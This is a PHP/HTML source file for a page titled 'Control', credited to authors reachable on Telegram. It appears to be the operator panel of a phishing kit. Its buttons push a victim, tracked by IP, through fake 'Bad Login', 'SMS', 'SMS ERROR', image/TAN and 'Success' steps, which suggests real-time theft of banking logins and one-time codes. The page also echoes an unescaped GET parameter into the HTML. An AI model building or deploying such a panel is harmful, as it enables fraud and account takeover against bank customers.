<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Control</title>
    </head>

    <body>
        
        <div class="container text-center pt30 pb30">
            <form method="post" action="index.php">
                <input type="hidden" name="step" value="control">
                <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                <button type="submit" class="btn btn-danger" name="to" value="errorlogin">Bad Login</button> 
                <button type="submit" class="btn btn-success" name="to" value="sms">SMS</button> 
                <button type="submit" class="btn btn-danger" name="to" value="errorsms">SMS ERROR</button> 

                <br><br>
                <div class="row">
                    <div class="col-md-6">
                        <input name="imgurl" class="form-control" style="float: right; max-width: 300px;" placeholder="image url"/>
                     </div> 
                    <div class="col-md-6">
                        <button type="submit" style="float: left;" class="btn btn-danger" name="to" value="tan">image</button> 
                    </div> 
                </div>
                
                
                <br><br>
                <button type="submit" class="btn btn-success" name="to" value="success">Success</button>
                <br>
            </form>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="assets/js/script.js"></script>

    </body>

</html>